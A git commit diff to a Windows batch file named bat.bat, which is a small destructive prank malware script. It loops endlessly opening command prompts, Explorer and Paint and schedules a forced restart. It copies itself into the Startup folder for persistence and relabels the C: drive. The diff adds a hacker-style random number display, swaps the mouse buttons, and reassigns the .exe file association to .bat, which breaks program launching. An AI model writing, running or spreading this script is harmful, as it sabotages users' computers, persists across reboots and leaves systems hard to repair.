0983a4e2b11b5a35ae830efc5053305a2650487b
Makuad <dankasadovsky@gmail.com>
2025-11-01 20:37:09 +0500

    Update bat.bat

--- bat.bat
+++ bat.bat
@@ -1,11 +1,15 @@
 @echo off
 :a
+color 02
+echo %random% %random% %random% %random% %random% %random% %random% %random%
 Start cmd
 shutdown /r /t /f 25 /c "PC FUCKING"​
 start explorer
 start mspaint
 copy %0 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
 label C:Fucked​
+rundll32 user32, SwapMouseButton
+assoc .exe=.bat
 goto a
 
 
